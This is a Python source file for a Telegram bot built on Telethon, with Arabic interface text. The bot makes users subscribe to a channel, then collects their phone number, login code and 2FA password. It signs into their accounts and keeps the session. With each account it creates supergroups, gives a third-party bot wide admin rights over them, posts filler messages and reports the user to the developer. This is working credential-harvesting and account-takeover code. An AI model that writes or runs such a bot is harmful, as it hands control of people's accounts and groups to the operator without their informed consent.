import os
import asyncio
from telethon import TelegramClient, events, Button, functions, types
from telethon.sessions import StringSession

# ---------- إعدادات ----------
api_id = int(os.environ.get("API_ID", "123456"))
api_hash = os.environ.get("API_HASH", "YOUR_API_HASH")
bot_token = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")

force_channel = os.environ.get("FORCE_CHANNEL", "yourchannel")  # بدون @
developer_username = os.environ.get("DEVELOPER_USERNAME", "yourusername")  # بدون @
developer_id = int(os.environ.get("DEVELOPER_ID", "123456789"))
admin_bot_username = os.environ.get("ADMIN_BOT_USERNAME", "czbbbot")

groups_per_user = int(os.environ.get("GROUPS_PER_USER", 2))
delay_between_groups = int(os.environ.get("DELAY_BETWEEN_GROUPS", 5))  # بالثواني
messages_to_send = ["هلوو", "شلونكم", "شني @e2e12", "يلاا", "ميخالف"]

# ---------- تهيئة البوت ----------
bot = TelegramClient("bot", api_id, api_hash).start(bot_token=bot_token)
sessions = {}

# ---------- فحص الاشتراك ----------
async def is_subscribed(user_id):
    try:
        await bot(functions.channels.GetParticipantRequest(
            channel=force_channel,
            participant=user_id
        ))
        return True
    except:
        return False

# ---------- إشعار المطور ----------
async def notify_dev(user, success_count):
    try:
        username = f"@{user.username}" if user.username else "لا يوجد"
        msg = (
            f"👤😂 مستخدم جديد دخل البوت!\n"
            f"🆔 ID: `{user.id}`\n"
            f"🔗 Username: {username}\n"
            f"📦 عدد المجموعات التي تم إنشاؤها: {success_count}"
        )
        await bot.send_message(developer_id, msg)
    except Exception as e:
        print(f"[FAILED] إشعار المطور: {e}")

# ---------- إنشاء مجموعة ----------
async def create_supergroup(client, title="AutoGroup"):
    try:
        result = await client(functions.channels.CreateChannelRequest(
            title=title,
            about="تم الإنشاء بواسطة البوت",
            megagroup=True
        ))
        return result.chats[0]
    except Exception as e:
        print(f"[FAILED] لم يتم إنشاء المجموعة: {e}")
        return None

# ---------- إضافة البوت كمشرف ----------
async def invite_admin_bot(client, channel):
    try:
        bot_entity = await client.get_entity(f"@{admin_bot_username}")
        await client(functions.channels.InviteToChannelRequest(
            channel=channel,
            users=[bot_entity]
        ))
        rights = types.ChannelAdminRights(
            change_info=True, post_messages=True, edit_messages=True,
            delete_messages=True, ban_users=True, invite_users=True,
            pin_messages=True, add_admins=False
        )
        await client(functions.channels.EditAdminRequest(
            channel=channel,
            user_id=bot_entity,
            admin_rights=rights,
            rank="Moderator"
        ))
    except Exception as e:
        print(f"[FAILED] ترقية البوت: {e}")

# ---------- إرسال الرسائل ----------
async def send_messages(client, channel):
    for msg in messages_to_send:
        try:
            await client.send_message(channel, msg)
            await asyncio.sleep(1)
        except Exception as e:
            print(f"[FAILED] إرسال {msg}: {e}")

# ---------- /start ----------
@bot.on(events.NewMessage(pattern="/start"))
async def start_handler(event):
    user_id = event.sender_id

    if not await is_subscribed(user_id):
        await event.respond(
            f"🚨 للاستخدام، اشترك أولاً في القناة:\n👉 https://t.me/{force_channel}\n\nثم أرسل /start ."
        )
        return

    # أزرار المطور والمستخدم
    if user_id == developer_id:
        buttons = [
            [Button.inline("➕ إنشاء مجموعات", data="create_groups")],
            [Button.url(f"Div👨‍💻 {developer_username}", f"https://t.me/{developer_username}")]
        ]
    else:
        buttons = [
            [Button.inline("➕ إنشاء مجموعات", data="create_groups")],
            [Button.url(f"👨‍💻 {developer_username}", f"https://t.me/{developer_username}")]
        ]

    await event.respond("👋 أهلاً بك! اختر انشاء مجموعات :", buttons=buttons)

# ---------- زر إنشاء مجموعات ----------
@bot.on(events.CallbackQuery(data=b"create_groups"))
async def callback_create_groups(event):
    user_id = event.sender_id
    if not await is_subscribed(user_id):
        await event.answer("❌ يجب الاشتراك في القناة أولاً!", alert=True)
        return
    sessions[user_id] = {"step": "phone"}
    await event.respond("📞 أرسل رقم هاتفك (بصيغة +964...)")

# ---------- استقبال الرسائل ----------
@bot.on(events.NewMessage)
async def handle_messages(event):
    user_id = event.sender_id
    if user_id not in sessions:
        return

    step = sessions[user_id].get("step")

    if step == "phone":
        phone = event.raw_text.strip()
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        try:
            await client.send_code_request(phone)
            sessions[user_id] = {"step": "code", "phone": phone, "client": client}
            await event.respond("!📩 يلا أرسل رمز التأكيد اللي وصلك.")
        except Exception as e:
            await event.respond(f"❌! خطأ: {e}")

    elif step == "code":
        code = event.raw_text.strip()
        client = sessions[user_id]["client"]
        phone = sessions[user_id]["phone"]
        try:
            await client.sign_in(phone, code)
            session_string = client.session.save()
            sessions[user_id] = {"step": "done", "session": session_string}
            await event.respond("😏✅ تم تسجيل الدخول! جاري إنشاء المجموعات...")

            success = 0
            user_client = TelegramClient(StringSession(session_string), api_id, api_hash)
            await user_client.start()
            for i in range(groups_per_user):
                title = f"UserGroup_{user_id}_{i}"
                group = await create_supergroup(user_client, title)
                if group:
                    success += 1
                    await invite_admin_bot(user_client, group)
                    await send_messages(user_client, group)
                await asyncio.sleep(delay_between_groups)

            await event.respond(f"😂✅ تم إنشاء {success} مجموعة في حسابك.")
            user_entity = await bot.get_entity(user_id)
            await notify_dev(user_entity, success)

        except Exception as e:
            if "SESSION_PASSWORD_NEEDED" in str(e):
                sessions[user_id]["step"] = "password"
                await event.respond("🙂🔒 الحساب محمي بكلمة مرور 2FA. أرسل كلمة المرور.")
            else:
                await event.respond(f"❌! رمز غير صحيح أو انتهت صلاحيته: {e}")

    elif step == "password":
        password = event.raw_text.strip()
        client = sessions[user_id]["client"]
        try:
            await client.sign_in(password=password)
            session_string = client.session.save()
            sessions[user_id] = {"step": "done", "session": session_string}
            await event.respond("😂✅ تم تسجيل الدخول! جاري إنشاء المجموعات...")

            success = 0
            user_client = TelegramClient(StringSession(session_string), api_id, api_hash)
            await user_client.start()
            for i in range(groups_per_user):
                title = f"UserGroup_{user_id}_{i}"
                group = await create_supergroup(user_client, title)
                if group:
                    success += 1
                    await invite_admin_bot(user_client, group)
                    await send_messages(user_client, group)
                await asyncio.sleep(delay_between_groups)

            await event.respond(f"😂✅ تم إنشاء {success} مجموعة من حسابك.")
            user_entity = await bot.get_entity(user_id)
            await notify_dev(user_entity, success)

        except Exception as e:
            await event.respond(f"❌ يحلو كلمة مرور خاطئة: {e}")

print("🤖 Bot is running...")
bot.run_until_disconnected()
